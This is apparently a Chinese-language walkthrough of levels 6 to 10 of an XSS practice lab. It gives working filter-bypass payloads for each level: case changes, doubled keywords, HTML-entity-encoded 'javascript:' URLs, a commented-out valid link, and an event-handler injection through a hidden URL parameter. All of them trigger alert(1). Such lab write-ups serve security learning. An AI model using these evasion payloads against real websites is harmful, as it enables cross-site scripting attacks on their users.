# Level 6 (大写绕过)

稍微尝试发现仍然有下划线限制，尝试超链接发现href也被加了下划线，

将href大写即可绕过，<!--"/><a Href=javascript:alert(1);>x</a>-->

# Level 7 (双写绕过)

尝试onmouseover发现on被吞了，那么可以尝试双写绕过。

<!--"oonnmouseover="alert(1)-->

# Level 8 (编码绕过)

这里给了我们一个友情链接选项，尝试一下会把你的输入当成一个链接来生成。

尝试正常的javascript发现被加了下划线，加入点在r和i之间，

再试试加个空格，并无卵用，

尝试将javascript使用unicode编码绕过，成功。

<!--&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)-->

# Level 9 (合法链接)

尝试level8中的payload发现他说不合法，卡了很久不知道怎么办，最后还是翻师傅的wp找到的办法。

在payload后面包含一个被注释掉的合法链接就可以过了。

<!--&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)//http://www.baidu.com-->

（为啥要注释我不太明白，希望有师傅带带）

# Level 10 (隐藏标签利用)

打开发现输入框没了，f12打开发现有三个被隐藏的标签。

尝试利用，用onmouseover的payload，发现link和history标签没用，sort成功。

注意此题在url中写入，payload: <!--https://xss.tesla-space.com/level10.php?t_sort="onmouseover="alert()"type="text-->gk